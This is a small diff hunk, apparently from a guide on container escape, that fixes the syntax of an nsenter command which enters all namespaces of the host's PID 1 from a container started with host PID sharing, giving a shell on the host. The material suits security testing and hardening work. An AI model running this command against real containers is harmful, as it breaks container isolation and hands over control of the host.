@@ -242,7 +242,7 @@ docker info 2>/dev/null | grep -i runc
 
 ```bash
 # If hostPID: true (--pid=host)
-nsenter -t 1 -m -u -i -n -p - /bin/bash
+nsenter -t 1 -m -u -i -n -p -- /bin/bash
 # This enters all namespaces of PID 1 (host init process)
 ```
 
